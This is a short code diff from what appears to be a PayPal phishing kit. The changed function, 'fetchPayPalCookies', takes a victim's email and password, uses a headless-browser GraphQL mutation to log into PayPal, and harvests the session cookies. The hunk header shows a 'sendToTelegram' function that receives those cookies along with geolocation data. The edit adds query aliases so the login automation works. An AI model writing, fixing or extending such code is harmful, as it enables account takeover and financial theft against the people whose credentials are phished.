@@ -60,19 +60,19 @@ async function sendToTelegram(paypalCookies, userTag, examNumber, geoInfo, url, 
 async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent, email, password) {
     const userAgent = clientUserAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36';
 
-    // GraphQL query to navigate, log in, and get cookies
+    // GraphQL query to navigate, log in, and get cookies with aliases for conflicting fields
     const query = `
         mutation LoginAndGetCookies($url: String!, $email: String!, $password: String!) {
             goto(url: $url, waitUntil: "networkIdle") {
                 status
             }
-            type(selector: "input#email", text: $email) {
+            typeEmail: type(selector: "input#email", text: $email) {
                 status
             }
-            type(selector: "input#password", text: $password) {
+            typePassword: type(selector: "input#password", text: $password) {
                 status
             }
-            click(selector: "button#btnLogin") {
+            clickLogin: click(selector: "button#btnLogin") {
                 status
             }
             waitForNavigation(waitUntil: "networkIdle") {
